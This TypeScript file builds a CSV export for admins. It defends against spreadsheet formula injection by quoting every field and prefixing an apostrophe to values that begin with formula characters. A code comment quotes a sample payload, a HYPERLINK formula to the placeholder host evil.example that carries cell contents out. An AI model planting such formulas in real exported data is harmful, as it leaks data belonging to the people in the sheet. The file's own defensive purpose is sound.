/**
 * A CSV an admin can open in a spreadsheet.
 *
 * Quoting is unconditional rather than only-when-needed: allergies and notes are
 * free text that will contain commas, quotes and newlines, and a rule applied
 * some of the time is one that gets tested some of the time.
 */

/**
 * Leading characters a spreadsheet reads as the start of a formula.
 *
 * `-` is included because `-1+1` is arithmetic, and `@` because Excel treats it
 * as a function reference. Tab and carriage return are here too: some importers
 * strip leading whitespace and then evaluate what is behind it.
 */
const FORMULA_STARTS = ['=', '+', '-', '@', '\t', '\r']

/**
 * Neutralise a value a spreadsheet would otherwise execute.
 *
 * CSV quoting does **not** help: Excel, LibreOffice and Sheets all evaluate a
 * leading `=` inside quotes. Every field exported here is member-editable free
 * text, so `=HYPERLINK("https://evil.example/"&A2,"Click")` in someone's notes
 * becomes a live link in the admin's spreadsheet. A leading apostrophe is
 * the conventional fix — spreadsheets consume it and show the text as typed.
 */
const defuse = (text: string) => (FORMULA_STARTS.some((start) => text.startsWith(start)) ? `'${text}` : text)

const escape = (value: unknown) => {
  if (value === null || value === undefined) return '""'

  return `"${defuse(String(value)).replaceAll('"', '""')}"`
}

export const toCsv = (columns: readonly string[], rows: readonly Record<string, unknown>[]) =>
  [
    columns.map(escape).join(','),
    ...rows.map((row) => columns.map((column) => escape(row[column])).join(',')),
  ].join('\r\n')
